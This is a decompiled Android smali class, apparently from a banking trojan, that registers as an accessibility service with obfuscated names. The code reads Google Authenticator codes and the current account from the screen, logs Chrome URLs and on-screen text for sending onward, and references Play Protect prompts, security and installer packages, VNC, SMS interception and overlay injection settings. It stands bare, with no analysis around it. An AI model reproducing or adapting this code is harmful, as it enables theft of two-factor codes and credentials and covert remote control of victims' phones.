.class public Lcom/beginhigh19/p023w;
.super Landroid/accessibilityservice/AccessibilityService;
.source "SourceFile"


# static fields
.field public static break:Ljava/lang/String;

.field public static case:Ljava/lang/String;

.field public static catch:Ljava/lang/String;

.field public static class:Ljava/lang/String;

.field public static const:Ljava/lang/String;

.field public static else:Ljava/lang/String;

.field public static final:Ljava/lang/String;

.field public static goto:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field public static super:Ljava/lang/String;

.field public static this:Ljava/util/Map;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Map<",
            "Ljava/lang/Integer;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static throw:Landroid/view/accessibility/AccessibilityEvent;

.field private static final try:Ljava/lang/String;

.field public static while:Lcom/beginhigh19/p023w;


# instance fields
.field public fddo:Landroid/content/Context;

.field public for:Z

.field public ifdf:I

.field public new:Lfddo/fddo;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "00fcf4492fcbc1fb7d25b63e52"

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/beginhigh19/p023w;->try:Ljava/lang/String;

    const-string v0, "Turn on Play Protect scanning|Activar el an\u00e1lisis de Play Protect"

    sput-object v0, Lcom/beginhigh19/p023w;->case:Ljava/lang/String;

    const-string v0, "com.android.settings|com.google.android.settings|com.miui.securitycenter|com.google.android.permissioncontroller|com.android.permissioncontroller|com.google.android.packageinstaller|com.android.packageinstaller|com.miui.global.packageinstaller|com.android.vending|com.miui.powerkeeper"

    sput-object v0, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    new-instance v0, Lcom/beginhigh19/p023w$fddo;

    invoke-direct {v0}, Lcom/beginhigh19/p023w$fddo;-><init>()V

    sput-object v0, Lcom/beginhigh19/p023w;->goto:Ljava/util/ArrayList;

    new-instance v0, Lcom/beginhigh19/p023w$ifdf;

    invoke-direct {v0}, Lcom/beginhigh19/p023w$ifdf;-><init>()V

    sput-object v0, Lcom/beginhigh19/p023w;->this:Ljava/util/Map;

    const-string v0, ""

    sput-object v0, Lcom/beginhigh19/p023w;->break:Ljava/lang/String;

    sput-object v0, Lcom/beginhigh19/p023w;->catch:Ljava/lang/String;

    sput-object v0, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    sput-object v0, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    sput-object v0, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    sput-object v0, Lcom/beginhigh19/p023w;->super:Ljava/lang/String;

    const/4 v0, 0x0

    sput-object v0, Lcom/beginhigh19/p023w;->throw:Landroid/view/accessibility/AccessibilityEvent;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lcom/beginhigh19/p023w;->ifdf:I

    iput-boolean v0, p0, Lcom/beginhigh19/p023w;->for:Z

    sput-object p0, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    return-void
.end method

.method public static case()Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/beginhigh19/p023w;->catch:Ljava/lang/String;

    if-nez v0, :cond_0

    const-string v0, ""

    :cond_0
    return-object v0
.end method

.method public static else(Ljava/lang/String;)Ljava/lang/String;
    .locals 6

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    const-string v1, ""

    if-eqz v0, :cond_0

    return-object v1

    :cond_0
    const-string v0, "|"

    const-string v2, ","

    invoke-virtual {p0, v0, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    const/4 v3, 0x0

    if-eqz v0, :cond_1

    invoke-virtual {p0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_1
    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    aput-object p0, v0, v3

    move-object p0, v0

    :goto_0
    array-length v0, p0

    :goto_1
    if-ge v3, v0, :cond_6

    aget-object v2, p0, v3

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_2

    goto :goto_2

    :cond_2
    sget-object v4, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v2, v4}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v4

    sget-object v5, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_3

    sget-object v5, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_3

    return-object v2

    :cond_3
    sget-object v5, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_4

    sget-object v5, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_4

    return-object v2

    :cond_4
    sget-object v5, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_5

    sget-object v5, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_5

    return-object v2

    :cond_5
    :goto_2
    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    :cond_6
    return-object v1
.end method

.method public static fddo(Ljava/lang/String;)Z
    .locals 6

    const-string v0, "|"

    const-string v1, ","

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-eqz v0, :cond_0

    invoke-virtual {p0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    new-array v0, v3, [Ljava/lang/String;

    aput-object p0, v0, v2

    move-object p0, v0

    :goto_0
    array-length v0, p0

    move v1, v2

    :goto_1
    if-ge v1, v0, :cond_5

    aget-object v4, p0, v1

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-eqz v5, :cond_1

    goto :goto_2

    :cond_1
    sget-object v5, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v4, v5}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v4

    sget-object v5, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_2

    sget-object v5, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    return v3

    :cond_2
    sget-object v5, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_3

    sget-object v5, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_3

    return v3

    :cond_3
    sget-object v5, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_4

    sget-object v5, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_4

    return v3

    :cond_4
    :goto_2
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_5
    return v2
.end method

.method public static goto()Ljava/lang/String;
    .locals 4

    sget-object v0, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    const-string v1, ","

    const-string v2, ""

    if-nez v0, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :cond_0
    sget-object v0, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    sget-object v0, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    sget-object v3, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :cond_1
    sget-object v0, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    sget-object v1, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    sget-object v1, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :cond_2
    return-object v2
.end method

.method private ifdf()V
    .locals 3

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v1, "acsb_task"

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public break(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 4

    const-string v0, ""

    sput-object p1, Lcom/beginhigh19/p023w;->throw:Landroid/view/accessibility/AccessibilityEvent;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    :try_start_0
    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v1, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-object v1, v0

    :goto_0
    :try_start_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v2, v3}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-object v2, v0

    :goto_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v3

    if-eqz v3, :cond_0

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    sget-object v0, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {p1, v0}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v0

    :cond_0
    sput-object v0, Lcom/beginhigh19/p023w;->catch:Ljava/lang/String;

    sput-object v2, Lcom/beginhigh19/p023w;->break:Ljava/lang/String;

    sput-object v2, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_1

    sput-object v1, Lcom/beginhigh19/p023w;->break:Ljava/lang/String;

    sput-object v1, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    :cond_1
    const/4 p1, 0x1

    return p1
.end method

.method public catch()Z
    .locals 6

    const-string v0, ".android."

    const-string v1, "system"

    const-string v2, ".miui."

    filled-new-array {v0, v1, v2}, [Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    const/4 v3, 0x3

    if-ge v2, v3, :cond_4

    aget-object v3, v0, v2

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_0

    goto :goto_1

    :cond_0
    sget-object v4, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v3, v4}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v3

    sget-object v4, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    const/4 v5, 0x1

    if-nez v4, :cond_1

    sget-object v4, Lcom/beginhigh19/p023w;->class:Ljava/lang/String;

    invoke-virtual {v4, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_1

    return v5

    :cond_1
    sget-object v4, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_2

    sget-object v4, Lcom/beginhigh19/p023w;->const:Ljava/lang/String;

    invoke-virtual {v4, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_2

    return v5

    :cond_2
    sget-object v4, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    sget-object v4, Lcom/beginhigh19/p023w;->final:Ljava/lang/String;

    invoke-virtual {v4, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    return v5

    :cond_3
    :goto_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_4
    return v1
.end method

.method public class()V
    .locals 6

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v1, "minimize_apps"

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    return-void

    :cond_0
    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "minimize_delay"

    invoke-static {v1, v3, v2}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-wide/16 v3, 0x0

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    const-string v4, "uptime"

    invoke-static {v2, v4, v3}, Lfddo/throw;->for(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    int-to-long v4, v1

    cmp-long v1, v2, v4

    if-gez v1, :cond_1

    return-void

    :cond_1
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ","

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/beginhigh19/p023w;->fddo(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v0}, Lfddo/fddo;->public()V

    :cond_2
    return-void
.end method

.method const()V
    .locals 4

    const-string v0, "com.google.android.apps.authenticator2"

    invoke-static {v0}, Lcom/beginhigh19/p023w;->fddo(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v1, "pin_value"

    invoke-static {v0, v1}, Lfddo/fddo;->else(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "GOOGLE_AUTH: auth code "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    :cond_1
    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x1

    const-string v2, "current_user"

    invoke-static {v0, v2, v1}, Lfddo/fddo;->goto(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Z)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "GOOGLE_AUTH: current user "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    :cond_2
    return-void
.end method

.method public final()V
    .locals 5

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->catch()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-static {v0, v1}, Lfddo/fddo;->catch(Landroid/content/Context;Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_3

    invoke-static {}, Lcom/beginhigh19/p023w;->goto()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    const-string v3, "; "

    if-nez v2, :cond_1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Package: "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_1
    const-string v1, "com.android.chrome"

    invoke-static {v1}, Lcom/beginhigh19/p023w;->fddo(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const-string v2, "url_bar"

    invoke-static {v1, v2}, Lfddo/fddo;->else(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_2

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "URL: "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_2
    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v1, v0}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    :cond_3
    return-void
.end method

.method public for()V
    .locals 7

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v1, "vnc"

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v3, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    const/4 v6, 0x0

    const-string v4, "SHORT_SMS"

    const-string v5, "com.android.phone"

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    const-string v1, "short_sms"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    return-void
.end method

.method public import()V
    .locals 2

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    new-instance v0, Lfddo/fddo;

    sget-object v1, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    invoke-direct {v0, v1}, Lfddo/fddo;-><init>(Lcom/beginhigh19/p023w;)V

    iput-object v0, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    :try_start_0
    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    const/4 v1, -0x1

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    const/16 v1, 0x13

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    const/16 v1, 0x10

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    sget-object v1, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    invoke-virtual {v1, v0}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public native()V
    .locals 5

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "injects_delay"

    invoke-static {v0, v2, v1}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-wide/16 v2, 0x0
